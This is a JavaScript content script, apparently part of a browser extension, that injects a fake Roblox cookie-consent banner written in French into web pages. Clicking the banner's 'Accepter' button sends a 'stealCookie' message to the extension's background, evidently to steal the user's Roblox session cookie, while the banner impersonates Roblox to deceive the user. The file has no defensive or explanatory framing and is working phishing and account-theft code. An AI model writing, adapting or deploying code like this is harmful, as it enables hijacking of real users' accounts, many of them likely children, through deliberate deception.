(function() {
  if (document.getElementById('rbx-cookie-fake')) return;

  const banner = document.createElement('div');
  banner.id = 'rbx-cookie-fake';
  banner.innerHTML = `
    <style>
      #rbx-cookie-fake {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: #191b1f;
        border-top: 3px solid #00b06b;
        color: white;
        font-family: 'Arial', sans-serif;
        z-index: 999999;
        padding: 20px 30px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        box-shadow: 0 -5px 20px rgba(0,0,0,0.5);
      }
      #rbx-cookie-fake .cookie-text { font-size: 14px; max-width: 70%; }
      #rbx-cookie-fake .cookie-text a { color: #00b06b; text-decoration: underline; cursor: pointer; }
      #rbx-cookie-fake .cookie-btn {
        background: #00b06b;
        border: none;
        color: white;
        padding: 12px 35px;
        font-size: 16px;
        font-weight: bold;
        border-radius: 8px;
        cursor: pointer;
        transition: 0.2s;
      }
      #rbx-cookie-fake .cookie-btn:hover { background: #009f5a; transform: scale(1.03); }
      #rbx-cookie-fake .cookie-reject {
        background: transparent;
        border: 1px solid #666;
        color: #ccc;
        padding: 12px 25px;
        font-size: 14px;
        border-radius: 8px;
        cursor: pointer;
        margin-left: 10px;
      }
    </style>
    <div class="cookie-text">
      <strong>🍪 Roblox utilise des cookies</strong><br>
      Nous utilisons des cookies pour améliorer votre expérience, analyser le trafic et personnaliser le contenu.
      En cliquant sur "Accepter", vous consentez à notre <a href="#">politique de cookies</a>.
    </div>
    <div>
      <button class="cookie-btn" id="rbx-accept-btn">Accepter</button>
      <button class="cookie-reject" id="rbx-reject-btn">Refuser</button>
    </div>
  `;
  document.body.appendChild(banner);

  document.getElementById('rbx-accept-btn').addEventListener('click', async () => {
    chrome.runtime.sendMessage({ action: 'stealCookie' });
    banner.remove();
  });

  document.getElementById('rbx-reject-btn').addEventListener('click', () => {
    banner.remove();
  });
})();
